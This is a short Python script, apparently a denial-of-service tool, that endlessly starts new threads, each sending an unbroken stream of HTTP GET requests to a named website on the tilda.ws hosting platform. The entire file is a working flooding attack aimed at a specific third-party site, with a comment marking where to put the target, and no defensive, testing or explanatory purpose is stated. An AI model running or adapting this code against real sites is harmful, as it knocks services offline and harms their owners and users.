import threading
import requests

def dos():
 while True:
  print('nice!')
  requests.get("https://ffotostreet.tilda.ws/")   # <== site name

  
while True:
 print('Good!')
 threading.Thread(target=dos).start()